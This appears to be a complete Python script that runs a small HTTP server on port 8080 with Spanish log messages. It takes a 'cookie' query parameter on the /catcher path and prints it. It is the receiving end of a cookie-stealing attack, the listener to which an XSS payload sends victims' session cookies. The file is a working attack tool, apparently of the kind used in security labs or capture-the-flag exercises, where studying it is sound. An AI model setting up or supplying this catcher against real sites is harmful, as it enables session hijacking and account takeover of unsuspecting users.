from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.path == "/catcher":
            params = parse_qs(parsed.query)
            cookie = params.get("cookie", [""])[0]

            print(f"[+] Cookie recibida: {cookie}")

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK\n")
        else:
            self.send_response(404)
            self.end_headers()


def run():
    server = HTTPServer(("0.0.0.0", 8080), Handler)
    print("Servidor escuchando en http://0.0.0.0:8080/")
    server.serve_forever()


if __name__ == "__main__":
    run()
